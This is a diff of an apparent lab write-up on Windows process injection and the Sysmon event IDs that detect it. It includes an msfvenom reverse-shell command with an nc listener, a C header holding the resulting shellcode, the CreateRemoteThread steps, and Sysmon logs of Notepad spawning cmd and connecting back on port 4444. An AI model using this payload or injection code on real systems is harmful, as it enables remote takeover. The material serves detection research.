@@ -5,9 +5,11 @@ What Each Sysmon Event ID Catches:
 - Event ID 25 ProcessTampering: Fires specifically on image replacement or process hollowing — when the mapped image in memory no longer matches the file on disk. Catches: hollowing, module stomping, some reflective DLL variants.
 <img width="942" height="712" alt="image" src="https://github.com/user-attachments/assets/65977293-a5d1-43cc-8dab-a8c0f33aa17d" />
 
-## Common header with shellcode
+## Init common header with shellcode
 On Kali run:
 - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.32.49 LPORT=4444 -f c -b \x00\x0a\x0d
+- nc -lvnp 4444
+
 
 Then common header used for each exploit
 ```
@@ -18,7 +20,7 @@ Then common header used for each exploit
 #include <stdint.h>
 
 
-unsigned char buf[] = 
+unsigned char shellcode[] = 
 "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
 "\xff\xff\xff\x48\xbb\xf8\xd1\x23\xeb\xbe\xe7\xfa\x58\x48"
 "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x04\x99\xa0"
@@ -76,7 +78,7 @@ DWORD GetPID(const wchar_t* procName) {
 }
 ```
 
-## 1. Classic CreateRemoteThread
+## Technique 1. Classic CreateRemoteThread
 The attack opens a handle to a running process, writes shellcode into its memory, then creates a new thread inside that process to execute it. All through documented Win32 API calls in kernel32.dll. It is the most well-known injection technique and should be detected by all EDR.
 The four API calls and what Sysmon sees at each step:
 - OpenProcess()    → EID 10 handle opened with PROCESS_ALL_ACCESS (0x1fffff)
@@ -141,3 +143,80 @@ int main() {
     return 0;
 }
 ```
+
+### SYSMON data
+1. "CreateRemoteThread detected:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2026-05-12 09:49:01.913
+SourceProcessGuid: {ED9BFE1B-F78D-6A02-B205-000000000A00}
+SourceProcessId: 5704
+SourceImage: C:\Users\jens\Documents\procInj\t1_classic_crt.exe
+TargetProcessGuid: {ED9BFE1B-F780-6A02-B105-000000000A00}
+TargetProcessId: 10500
+TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+NewThreadId: 1360
+StartAddress: 0x0000016766340000
+StartModule: -
+StartFunction: -
+SourceUser: WIN11\jens
+TargetUser: WIN11\jens"
+
+2. "Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2026-05-12 09:49:02.079
+ProcessGuid: {ED9BFE1B-F78E-6A02-B505-000000000A00}
+ProcessId: 12536
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: cmd
+CurrentDirectory: C:\Users\jens\
+User: WIN11\jens
+LogonGuid: {ED9BFE1B-E11B-6A02-743F-0B0000000000}
+LogonId: 0xb3f74
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
+ParentProcessGuid: {ED9BFE1B-F780-6A02-B105-000000000A00}
+ParentProcessId: 10500
+ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
+ParentUser: WIN11\jens"
+
+3. "Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2026-05-12 09:49:02.082
+SourceProcessGUID: {ED9BFE1B-F780-6A02-B105-000000000A00}
+SourceProcessId: 10500
+SourceThreadId: 1360
+SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+TargetProcessGUID: {ED9BFE1B-F78E-6A02-B505-000000000A00}
+TargetProcessId: 12536
+TargetImage: C:\WINDOWS\system32\cmd.exe
+GrantedAccess: 0x1fffff
+CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(00000167663401BC)
+SourceUser: WIN11\jens
+TargetUser: WIN11\jens"
+
+4. "Network connection detected:
+RuleName: technique_id=T1571,technique_name=Non-Standard Port
+UtcTime: 2026-05-12 09:49:03.416
+ProcessGuid: {ED9BFE1B-F780-6A02-B105-000000000A00}
+ProcessId: 10500
+Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+User: WIN11\jens
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 192.168.32.39
+SourceHostname: -
+SourcePort: 50783
+SourcePortName: -
+DestinationIsIpv6: false
+DestinationIp: 192.168.32.49
+DestinationHostname: -
+DestinationPort: 4444
+DestinationPortName: -"
